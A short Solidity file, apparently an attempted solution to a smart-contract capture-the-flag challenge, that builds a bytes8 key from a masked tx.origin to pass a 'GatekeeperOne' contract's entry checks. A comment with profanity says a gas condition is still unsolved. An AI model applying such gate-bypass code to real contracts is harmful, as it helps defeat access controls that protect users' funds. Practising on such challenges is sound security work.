// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperOne {
  function entrant() external returns (address);
  function enter(bytes8) external returns (bool);
}

contract A {
  // im losing my god damn mind here just tell me how much gas you need
  function fuckUp(address contractAddress) external {
    uint64 x = uint64(uint256(tx.origin));
    x = x & 0xFFFFFFFF0000FFFF;
    GatekeeperOne(contractAddress).enter(bytes8(x));
  }
}